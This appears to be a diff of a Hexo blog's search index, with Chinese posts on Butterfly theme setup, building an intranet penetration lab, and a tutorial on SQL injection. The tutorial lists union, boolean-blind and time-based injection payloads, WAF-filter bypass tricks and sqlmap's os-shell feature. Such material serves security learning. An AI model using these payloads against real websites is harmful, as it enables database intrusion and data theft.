@@ -2,7 +2,7 @@
 <search>
   <entry>
     <title>butterfly主题配置日记之二</title>
-    <url>/posts/0.html</url>
+    <url>/posts/3bb96528.html</url>
     <content><![CDATA[<h1 id="math教学："><a href="#math教学：" class="headerlink" title="math教学："></a>math教学：</h1><p>不知道是什么东西呐，应该用不着。默认就好了</p>
 <h1 id="搜索："><a href="#搜索：" class="headerlink" title="搜索："></a>搜索：</h1><p>啊，这个东西浪费了我好长时间，不过搞定了就好QAQ</p>
 <ol>
@@ -64,7 +64,7 @@
   </entry>
   <entry>
     <title>butterfly主题配置日记</title>
-    <url>/posts/0.html</url>
+    <url>/posts/fb0904d.html</url>
     <content><![CDATA[<h1 id="butterfly-配置"><a href="#butterfly-配置" class="headerlink" title="butterfly 配置"></a>butterfly 配置</h1><h2 id="1-网站资料"><a href="#1-网站资料" class="headerlink" title="1.网站资料"></a>1.网站资料</h2><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">title:</span> <span class="string">蓝涴</span></span><br><span class="line"><span class="attr">subtitle:</span> <span class="string">&#x27;可可爱爱，没有脑袋&#x27;</span></span><br><span class="line"><span class="attr">description:</span> <span class="string">&#x27;爱好蓝色desu&#x27;</span></span><br><span class="line"><span class="attr">keywords:</span> <span class="string">&#x27;渗透,hack&#x27;</span></span><br><span class="line"><span class="attr">author:</span> <span class="string">Lanyuan</span></span><br><span class="line"><span class="attr">language:</span> <span class="string">zh-CN</span></span><br><span class="line"><span class="attr">timezone:</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="attr">email:</span> </span><br></pre></td></tr></table></figure>
 <h2 id="2-导航栏设置"><a href="#2-导航栏设置" class="headerlink" title="2.导航栏设置"></a>2.导航栏设置</h2><h3 id="2-1-参数设置："><a href="#2-1-参数设置：" class="headerlink" title="2-1 参数设置："></a>2-1 参数设置：</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">nav:</span></span><br><span class="line">  <span class="attr">logo:</span> <span class="comment">#image 网站logo图片，</span></span><br><span class="line">  <span class="attr">display_title:</span> <span class="literal">true</span> <span class="comment">#是否显示网站标题</span></span><br><span class="line">  <span class="attr">fixed:</span> <span class="literal">false</span> <span class="comment"># fixed navigation bar 是否固定状态栏</span></span><br></pre></td></tr></table></figure>
 <h3 id="2-2-菜单目录："><a href="#2-2-菜单目录：" class="headerlink" title="2-2 菜单目录："></a>2-2 菜单目录：</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="attr">Home:</span> <span class="string">/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-home</span></span><br><span class="line">  <span class="string">追番:</span> <span class="string">/bangumis/index.html</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-home</span></span><br><span class="line">  <span class="string">留言板:</span> <span class="string">/comments/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-envelope</span></span><br><span class="line">  <span class="comment"># Archives: /archives/ || fas fa-archive</span></span><br><span class="line">  <span class="comment"># Tags: /tags/ || fas fa-tags</span></span><br><span class="line">  <span class="comment"># Categories: /categories/ || fas fa-folder-open</span></span><br><span class="line">  <span class="comment"># List||fas fa-list ||hide:</span></span><br><span class="line">  <span class="comment">#   Music: /music/ || fas fa-music</span></span><br><span class="line">  <span class="comment">#   Movie: /movies/ || fas fa-video</span></span><br><span class="line">  <span class="comment"># Link: /link/ || fas fa-link</span></span><br><span class="line">  <span class="comment"># About: /about/ || fas fa-heart</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
@@ -496,11 +496,11 @@
 <p>一般域控都不出网的，所以基本就是仅主机模式。</p>
 </blockquote>
 <p>配置静态IP，这里的网关默认是10.10.10.2，子网掩码因为是a类地址，所以是255.0.0.0</p>
-<p><img src="C:\Users\moaiyuan\AppData\Roaming\Typora\typora-user-images\image-20240504110334104.png" alt="image-20240504110334104" style="zoom:50%;" /> </p>
+<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240504110334104.png" alt="image-20240504110334104" style="zoom:50%;" /></p>
 <p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240504110508210.png" alt="image-20240504110508210" style="zoom:50%;" /> </p>
 <p> 这样子就是成功了x</p>
 <p>然后进入服务器管理添加角色 = &gt; 下一步 = &gt; 下一步 = &gt; 下一步 =&gt; 添加active directory 域服务 （DNS服务器 ，可选 会自动安装的。x主机名也可以自己改的。)</p>
-<p><img src="C:\Users\moaiyuan\AppData\Roaming\Typora\typora-user-images\image-20240504111339867.png" alt="image-20240504111339867" style="zoom:50%;" /> </p>
+<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240504111339867.png" alt="image-20240504111339867" style="zoom:50%;" /></p>
 <p>来到下一步，这里安装了域服务，但还没有成为域控，还需要进一步配置</p>
 <p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240504111451746.png" alt="image-20240504111451746" style="zoom:50%;" /> </p>
 <p>然后选择 添加新林，然后自己取一个根域名字 。（这里大小写不会区分的  ，请自己取一个，<psw>这里是lanyuan.com</psw></p>
@@ -569,12 +569,12 @@
 <p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240503214945077.png" alt="image-20240503214945077" style="zoom: 50%;" /> </p>
 <h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><h2 id="拓扑图如下"><a href="#拓扑图如下" class="headerlink" title="拓扑图如下"></a>拓扑图如下</h2><p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240503215713087.png" alt="image-20240503215713087" style="zoom: 50%;" /> </p>
 <h2 id="网卡配置"><a href="#网卡配置" class="headerlink" title="网卡配置"></a>网卡配置</h2><p>点击 编辑 =&gt; 虚拟网络编辑器。在里面配置网卡。</p>
-<p><img src="C:\Users\moaiyuan\AppData\Roaming\Typora\typora-user-images\image-20240503220012554.png" alt="image-20240503220012554" style="zoom: 50%;" /> </p>
+<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240503220012554.png" alt="image-20240503220012554" style="zoom: 50%;" /></p>
 <p>首先要点击 更改设置 管理员模式才能对这个进行更改。</p>
 <p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240503221244410.png" alt="image-20240503221244410" style="zoom:50%;" /> </p>
 <p>根据拓扑图，需要设置一个nat模式的 以及两个 仅主机模式的网卡,不过nat模式可以自动获取，并且这里centos也已经配好了IP地址，所以可以不用管的</p>
 <p>那么就只需要配置192.168.22.0/24和192.168.33.0/24段的网卡。设置好子网IP和子网掩码就ok了，还有DHCP也要设置一下从0到255.</p>
-<p><img src="image-20240503224427829.png" alt="image-20240503224427829" style="zoom:50%;" /> vmnet3</p>
+<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240503224427829.png" alt="image-20240503224427829" style="zoom:50%;" /> vmnet3</p>
 <p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240503224543245.png" alt="image-20240503224543245" style="zoom:50%;" /> vmnet2</p>
 <p>配置完成后就可以给机器安装网卡了</p>
 <h3 id="选中Target1"><a href="#选中Target1" class="headerlink" title="选中Target1"></a>选中Target1</h3><p>点击 编辑虚拟器设置 =&gt; 添加 =&gt; 网络适配器 =&gt; 确认</p>
@@ -588,7 +588,7 @@
 <p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240503225441205.png" alt="image-20240503225441205" style="zoom:50%;" /> </p>
 <h2 id="配置宝塔web服务"><a href="#配置宝塔web服务" class="headerlink" title="配置宝塔web服务"></a>配置宝塔web服务</h2><p>登录进入Target1，账号密码在左下角的描述都有说明 （root : root）</p>
 <p>输入ifconfig查看配置是否成功</p>
-<p><img src="image-20240503230007032.png" alt="image-20240503230007032" style="zoom: 67%;" /> </p>
+<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240503230007032.png" alt="image-20240503230007032" style="zoom: 67%;" /></p>
 <p>嗯，看到如图差不多的样子就说明成功，其中192.168.190.132 会视情况有所不同。</p>
 <p>没有获取IP地址可以尝试</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart network <span class="comment">#重启网络</span></span><br><span class="line">reboot <span class="comment">#重启系统</span></span><br></pre></td></tr></table></figure>
@@ -600,12 +600,12 @@
 <figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">账号：eaj3yhsl</span></span><br><span class="line"><span class="string">密码：41bb8fee</span></span><br></pre></td></tr></table></figure>
 <p>这之后点击网站 =&gt;设置 =&gt; 域名管理 =&gt; 添加两个IP地址的站点</p>
 <p> <img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240503233237564.png" alt="image-20240503233237564"></p>
-<p><img src="image-20240503231201812.png" alt="image-20240503231201812"></p>
+<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240503231201812.png" alt="image-20240503231201812"></p>
 <p>访问如上的url 看到如上界面就代表成功了·</p>
 <p>进入Target2。账号密码还是左下描述有 （root ：root),还是老样子 ifconfig看配置成功没有</p>
 <p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240503231515572.png" alt="image-20240503231515572" style="zoom:67%;" /> </p>
 <p>不过这里还要回去改一下虚拟网卡的设置  设置能够连接到主机不然连不上web，连接完记得改回去</p>
-<p><img src="image-20240503231854373.png" alt="image-20240503231854373" style="zoom:50%;" /> </p>
+<p>&lt;img src=”<a href="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240503231854373.png">https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240503231854373.png</a>“ alt=”image-20240503231854373” style=”zoom:50%;” </p>
 <p>进入web后台，这里都一样不用改了</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.22.22:8888/2cc52ec0/</span><br><span class="line">账号：xdynr37d</span><br><span class="line">密码：123qwe..</span><br></pre></td></tr></table></figure>
 <p>网站 =&gt; 设置 =&gt; 添加域名 192.168.33.22 ,浏览器访问192.168.22.22页面成功就好了</p>
@@ -627,5 +627,662 @@
     <title>test2</title>
     <url>/posts/13bb8d58.html</url>
     <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>SQL注入</title>
+    <url>/posts/e73517db.html</url>
+    <content><![CDATA[<h1 id="sql注入介绍："><a href="#sql注入介绍：" class="headerlink" title="sql注入介绍："></a>sql注入介绍：</h1><h2 id="数据库简介："><a href="#数据库简介：" class="headerlink" title="数据库简介："></a>数据库简介：</h2><p>数据库查询和设计语言，用于存取数据以及查询；常见数据库mysql；mongodb；grepsql</p>
+<h2 id="SQL语句："><a href="#SQL语句：" class="headerlink" title="SQL语句："></a>SQL语句：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from 【表名】</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into user(id,username,password) values(xx,&#x27;xx&#x27;,&#x27;xx&#x27;)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">语法：</span><br><span class="line">    DELETE FROM 表名称 WHERE 列名称 = 值</span><br><span class="line">    DELETE * FROM 表名称</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">delete * from</span><br></pre></td></tr></table></figure>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">内嵌注入：</span></span><br><span class="line"><span class="string">/*!/*!*/</span></span><br><span class="line"><span class="string">/*</span> <span class="string">*/</span> <span class="string">在mysql中是多行注释</span> <span class="string">但是如果里面加了!</span> <span class="string">那么后面的内容会被执行</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">having where；</span><br><span class="line">区别对于不同的</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">order by 和 group by</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">三种注释：</span><br><span class="line">/&quot;&quot;/</span><br><span class="line">--+</span><br><span class="line">#</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">describe </span><br><span class="line">mysql -uroot -p</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="MySQL基础："><a href="#MySQL基础：" class="headerlink" title="MySQL基础："></a>MySQL基础：</h2><h2 id="MySQL系统表："><a href="#MySQL系统表：" class="headerlink" title="MySQL系统表："></a>MySQL系统表：</h2><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">information_schema</span>	<span class="comment">#数据库</span></span><br><span class="line">	<span class="string">-.Schemata</span>	    <span class="comment">#表名</span></span><br><span class="line">		<span class="string">-shcema_name</span>  <span class="comment">#包含所有数据库名</span></span><br><span class="line">	<span class="string">-.Tables</span></span><br><span class="line">		<span class="string">-table_name</span> 	<span class="comment">#包含所有表名</span></span><br><span class="line">		<span class="string">-table_schema</span>	<span class="comment">#指定当前数据库</span></span><br><span class="line">	<span class="string">-.Columns</span></span><br><span class="line">		<span class="string">-table_schema</span> <span class="comment">#指定数据库</span></span><br><span class="line">		<span class="string">-table_name</span>   <span class="comment">#指定表</span></span><br><span class="line">		<span class="string">-column_name</span>	<span class="comment">#包含所有列名</span></span><br></pre></td></tr></table></figure>
+<h2 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h2><h3 id="注入原理"><a href="#注入原理" class="headerlink" title="注入原理"></a>注入原理</h3><p>由于web应用程序对用户输入的数据合法性判断不严格，将恶意的sql命令注入到程序后台并在数据库中执行。</p>
+<h3 id="注入危害："><a href="#注入危害：" class="headerlink" title="注入危害："></a>注入危害：</h3><p>获取敏感信息；可以使用万能密码登录网站后台；执行系统命令；文件系统操作；注册表操作；</p>
+<h3 id="注入判断："><a href="#注入判断：" class="headerlink" title="注入判断："></a>注入判断：</h3><p>根据返回包的显示结果吧</p>
+<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="参数类型："><a href="#参数类型：" class="headerlink" title="参数类型："></a>参数类型：</h3><p>数字型</p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">$sql=&quot;select</span> <span class="string">name</span> <span class="string">from</span> <span class="string">users</span> <span class="string">where</span> <span class="string">id</span> <span class="string">=1&quot;</span></span><br><span class="line"><span class="string">参数没有被引号包裹</span></span><br></pre></td></tr></table></figure>
+<p>字符型</p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">$sql=&quot;select</span> <span class="string">name</span> <span class="string">from</span> <span class="string">users</span> <span class="string">where</span> <span class="string">id=&#x27;1&#x27;&quot;</span></span><br><span class="line"><span class="string">参数被&#x27;或是&quot;包裹起来</span></span><br></pre></td></tr></table></figure>
+<p>搜索型</p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">$sql=&quot;select</span> <span class="string">*</span> <span class="string">from</span> <span class="string">users</span> <span class="string">where</span> <span class="string">name</span> <span class="string">like</span> <span class="string">&#x27;%tom%&#x27;</span></span><br><span class="line"><span class="string">搜索项相对字符型多了一对%</span></span><br></pre></td></tr></table></figure>
+<h3 id="数据库返回结果分类："><a href="#数据库返回结果分类：" class="headerlink" title="数据库返回结果分类："></a>数据库返回结果分类：</h3><p>1.回显注入</p>
+<p>2.盲注</p>
+<p>3.报错注入</p>
+<h3 id="注入点位置分类："><a href="#注入点位置分类：" class="headerlink" title="注入点位置分类："></a>注入点位置分类：</h3><p>1.get</p>
+<p>2.post</p>
+<p>3.header</p>
+<p>4.cookie</p>
+<p>…..等等</p>
+<h2 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h2><h3 id="get显错注入流程"><a href="#get显错注入流程" class="headerlink" title="get显错注入流程"></a>get显错注入流程</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">.获取字段数</span> <span class="string">order</span> <span class="string">by</span></span><br><span class="line"><span class="number">2</span><span class="string">.获取显示位</span> <span class="string">union</span> <span class="string">select</span> <span class="number">1</span><span class="string">,2,3....x</span></span><br><span class="line"><span class="number">3</span><span class="string">.获取数据库信息</span> <span class="string">version（）user()@@datadir</span></span><br><span class="line"><span class="number">4</span><span class="string">.获取当前数据库</span> <span class="string">database（）schema()</span></span><br><span class="line"><span class="number">5</span><span class="string">.获取所有数据库</span></span><br><span class="line"><span class="number">6</span><span class="string">.获取数据库表</span></span><br><span class="line"><span class="number">7</span><span class="string">.获取所有字段</span></span><br><span class="line"><span class="number">8</span><span class="string">.获取数据</span></span><br></pre></td></tr></table></figure>
+<h3 id="盲注基本流程"><a href="#盲注基本流程" class="headerlink" title="盲注基本流程"></a>盲注基本流程</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="number">01</span><span class="string">、获取当前数据库长度length</span></span><br><span class="line"><span class="number">02</span><span class="string">、获取当前数据库名</span></span><br><span class="line"><span class="number">03</span><span class="string">、获取当前数据库表总数count</span></span><br><span class="line"><span class="number">04</span><span class="string">、获取当前数据库表的长度</span></span><br><span class="line"><span class="number">05</span><span class="string">、获取当前数据库表名</span></span><br><span class="line"><span class="number">06</span><span class="string">、获取当前数据库表的字段总数</span></span><br><span class="line"><span class="number">07</span><span class="string">、获取当前数据库表的字段第N个长度</span></span><br><span class="line"><span class="number">08</span><span class="string">、获取当前数据库表的字段第N个字段名</span></span><br><span class="line"><span class="number">09</span><span class="string">、获取当前数据库表的字段内容长度</span></span><br><span class="line"><span class="number">10</span><span class="string">、获取当前数据库表的字段内容</span></span><br></pre></td></tr></table></figure>
+<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">逻辑运算符：and、or、!=</span><br><span class="line">and：并且，前后两条语句必须全为真，才为真，否则为假。</span><br><span class="line">1=1 and 2=2        真</span><br><span class="line">1=1 and 1=2     假</span><br><span class="line"></span><br><span class="line">or：或者，前后两条语句一条为真，就为真。</span><br><span class="line"></span><br><span class="line">!= ：不等于</span><br><span class="line"></span><br><span class="line">在sql语言中，and优先级大于or</span><br></pre></td></tr></table></figure>
+<h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">--+</span>     <span class="string">注释符</span></span><br><span class="line"><span class="string">limit</span> <span class="number">0</span><span class="string">,1</span>      <span class="string">从你表中的第一个数据开始，只读取一个</span></span><br><span class="line"><span class="string">order</span> <span class="string">by</span>      <span class="string">排序，判断字段数量，也就是表的列数</span></span><br><span class="line"><span class="string">union</span> <span class="string">select</span>  <span class="string">联合查询，连接前面语句，起着合并查询的作用</span></span><br><span class="line"><span class="string">group_concat</span>  <span class="string">合并多行数据到一行</span></span><br><span class="line"></span><br><span class="line"><span class="string">version()</span>    <span class="string">当前数据库版本</span></span><br><span class="line"><span class="string">database()</span>   <span class="string">当前数据库</span></span><br><span class="line"><span class="string">@@datadir</span>    <span class="string">数据库数据路径</span></span><br><span class="line"><span class="string">@@version_compile_os</span>    <span class="string">操作系统版本</span></span><br></pre></td></tr></table></figure>
+<h3 id="字符截取"><a href="#字符截取" class="headerlink" title="字符截取"></a>字符截取</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">在sql里面直接执行，需要先use</span> <span class="string">【指定的数据库】；</span></span><br><span class="line"><span class="comment"># 截取结果中的值，从第一个字符开始，截取1个字符</span></span><br><span class="line"><span class="string">select</span> <span class="string">mid(database(),1,1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 截取结果中的值，从第一个字符开始，截取1个字符</span></span><br><span class="line"><span class="string">select</span> <span class="string">substr(database(),1,1)</span></span><br></pre></td></tr></table></figure>
+<h3 id="计算字符的ASCII值"><a href="#计算字符的ASCII值" class="headerlink" title="计算字符的ASCII值"></a>计算字符的ASCII值</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 返回字符串第一个字符的 ASCII 值</span></span><br><span class="line"><span class="string">select</span> <span class="string">ascii(&#x27;hello&#x27;);</span></span><br><span class="line"><span class="string">select</span> <span class="string">ord(&#x27;hello&#x27;);</span></span><br><span class="line"><span class="string">CyberChef：加密解密</span></span><br><span class="line"><span class="comment"># 将截取出来的字符，转换成ASCII码，以便于后面做运算</span></span><br><span class="line"><span class="string">select</span> <span class="string">ascii(substr(database(),1,1));</span></span><br><span class="line"><span class="string">select</span> <span class="string">ord(substr(database(),1,1));</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 结果为1或者0，也就是true or false</span></span><br><span class="line"><span class="string">select</span> <span class="string">ascii(substr(database(),1,1))&gt;97;</span></span><br><span class="line"><span class="string">select</span> <span class="string">ord(substr(database(),1,1))&gt;97;</span></span><br></pre></td></tr></table></figure>
+<h3 id="长度"><a href="#长度" class="headerlink" title="长度"></a>长度</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 返回当前数据库长度</span></span><br><span class="line"><span class="string">select</span> <span class="string">length(database());</span></span><br></pre></td></tr></table></figure>
+<h3 id="计算行数"><a href="#计算行数" class="headerlink" title="计算行数"></a>计算行数</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 返回查询结果行数</span></span><br><span class="line"><span class="string">select</span> <span class="string">count(username)</span> <span class="string">from</span> <span class="string">users;</span></span><br></pre></td></tr></table></figure>
+<h3 id="left，right"><a href="#left，right" class="headerlink" title="left，right"></a>left，right</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 返回当前数据库最左边的1个字符串</span></span><br><span class="line"><span class="string">select</span> <span class="string">left(database(),1);</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回当前数据库最右边的1个字符串</span></span><br><span class="line"><span class="string">select</span> <span class="string">right(database(),1);</span></span><br></pre></td></tr></table></figure>
+<h3 id="concat-str1-str2…-str-n"><a href="#concat-str1-str2…-str-n" class="headerlink" title="concat( str1, str2…. str n )"></a>concat( str1, str2…. str n )</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">用来连接两个字段</span></span><br><span class="line"><span class="string">和它类似的是</span></span><br><span class="line"><span class="string">concat(ch,str1,str2...strn)</span></span><br><span class="line"><span class="string">将多个字符串用ch分隔并连接起来</span></span><br></pre></td></tr></table></figure>
+<h3 id="group-concat"><a href="#group-concat" class="headerlink" title="group_concat()"></a>group_concat()</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">使用group_concat()可以将多行数据合并成一行</span></span><br></pre></td></tr></table></figure>
+<h2 id="实际过程之联合注入"><a href="#实际过程之联合注入" class="headerlink" title="实际过程之联合注入"></a>实际过程之联合注入</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.判断注入点</span><br><span class="line">#这里的&#x27;实际上是用来闭合的，如果是数字型那可能就没有，也可能是）啊什么的；字符型的话就可能是&#x27; &#x27;) &quot; &quot;) &quot;))，爱，按实际情况来就好；</span><br><span class="line">id=1&#x27; and 1=1 --+</span><br><span class="line">页面未返回内容</span><br><span class="line">id=1&#x27; and 1=2 --+</span><br><span class="line">2获取当前数据长度</span><br><span class="line">id=1&#x27; and length(database())=8--+</span><br><span class="line">3获取当前数据库</span><br><span class="line">id=1&#x27; and left((database()),1)=&#x27;s&#x27;--+</span><br><span class="line">获取第一位，第二位....第八位</span><br><span class="line">4获取当前数据库总表数</span><br><span class="line">id=1&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())=4--+</span><br><span class="line">5获取数据表的长度</span><br><span class="line"># 第一个数据库表长度</span><br><span class="line">id=1&#x27; and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)=6--+</span><br><span class="line"></span><br><span class="line"># 第二个数据库表长度</span><br><span class="line">id=1&#x27; and (select length(table_name) from information_schema.tables where table_schema=database() limit 1,1)=8--+</span><br><span class="line">6获取当前数据库下的表名</span><br><span class="line">id=1&#x27; and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)=&#x27;e&#x27;--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="实际过程之报错注入"><a href="#实际过程之报错注入" class="headerlink" title="实际过程之报错注入"></a>实际过程之报错注入</h2><h2 id="实际过程之盲注入"><a href="#实际过程之盲注入" class="headerlink" title="实际过程之盲注入"></a>实际过程之盲注入</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.判断注入点</span><br><span class="line">id=1&#x27; and 1=1 --+</span><br><span class="line">id=1&#x27; and 1=2 --+</span><br><span class="line">2.获取当前数据库长度（8）</span><br><span class="line">id=1&#x27; and length(database())=8--+</span><br><span class="line">3.获取当前数据库名字（security）</span><br><span class="line">id=1&#x27; and left((database()),1)=&#x27;s&#x27;--+</span><br></pre></td></tr></table></figure>
+<h2 id="SQLMAP-—os-shell原理"><a href="#SQLMAP-—os-shell原理" class="headerlink" title="SQLMAP —os-shell原理"></a>SQLMAP —os-shell原理</h2><p>必要条件：1.拥有写入权限；2.secure_file_priv参数为空或者为指定路径</p>
+<p>普通注入—os-shell主要是通过上传一个sqlmap的马，然后通过马来进行命令执行</p>
+<p>SQLMAP检测注入</p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">python</span> <span class="string">sqlmap.py</span> <span class="string">--os-shell</span></span><br></pre></td></tr></table></figure>
+<h2 id="绕过空格（注释符-，-a0）："><a href="#绕过空格（注释符-，-a0）：" class="headerlink" title="绕过空格（注释符/ /，%a0）："></a>绕过空格（注释符/<em> </em>/，%a0）：</h2><p>两个空格代替一个空格，用Tab代替空格，%a0=空格：</p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">%20%09%0a</span> <span class="string">%0b</span> <span class="string">%0c</span> <span class="string">%0d</span> <span class="string">%a0/**/</span></span><br></pre></td></tr></table></figure>
+<p>最基本的绕过方法，用注释替换空格：</p>
+<p>/<em>注释</em>/</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/4d3b339fd774e21dbdb1b1e436d82e44.webp" alt="img"></p>
+<h2 id="括号绕过空格："><a href="#括号绕过空格：" class="headerlink" title="括号绕过空格："></a>括号绕过空格：</h2><p>如果空格被过滤，括号没有被过滤，可以用括号绕过。</p>
+<p>在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。</p>
+<p>例如：</p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">select(user())fromdualwhere(1=1)and(2=2)</span></span><br></pre></td></tr></table></figure>
+<p>这种过滤方法常常用于time based盲注,例如：</p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23</span></span><br></pre></td></tr></table></figure>
+<p>（from for属于逗号绕过下面会有）</p>
+<p>上面的方法既没有逗号也没有空格。猜解database（）第一个字符ascii码是否为109，若是则加载延时。</p>
+<h2 id="引号绕过（使用十六进制）："><a href="#引号绕过（使用十六进制）：" class="headerlink" title="引号绕过（使用十六进制）："></a>引号绕过（<strong>使用十六进制</strong>）：</h2><p>会使用到引号的地方一般是在最后的where子句中。如下面的一条sql语句，这条语句就是一个简单的用来查选得到users表中所有字段的一条语句：</p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">selectcolumn_namefrominformation_schema.tableswheretable_name=&quot;users&quot;</span></span><br></pre></td></tr></table></figure>
+<p>这个时候如果引号被过滤了，那么上面的where子句就无法使用了。那么遇到这样的问题就要使用<strong>十六进制</strong>来处理这个问题了。</p>
+<p>users的十六进制的字符串是7573657273。那么最后的sql语句就变为了：</p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">selectcolumn_namefrominformation_schema.tableswheretable_name=0x7573657273</span></span><br></pre></td></tr></table></figure>
+<h2 id="逗号绕过（limit使用from或者offset）（substr使用from-for属于逗号）："><a href="#逗号绕过（limit使用from或者offset）（substr使用from-for属于逗号）：" class="headerlink" title="逗号绕过（limit使用from或者offset）（substr使用from for属于逗号）："></a>逗号绕过（limit<strong>使用from或者offset</strong>）（substr使用from for属于逗号）：</h2><p>在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决：</p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">select</span> <span class="string">substr(database(0from1for1);select</span> <span class="string">mid(database(0from1for1);</span></span><br></pre></td></tr></table></figure>
+<p>对于limit可以使用offset来绕过：</p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">select*fromnews</span> <span class="string">limit0,1</span>	<span class="comment"># 等价于下面这条SQL语句</span></span><br><span class="line"><span class="string">select*fromnews</span> <span class="string">limit1offset0</span></span><br></pre></td></tr></table></figure>
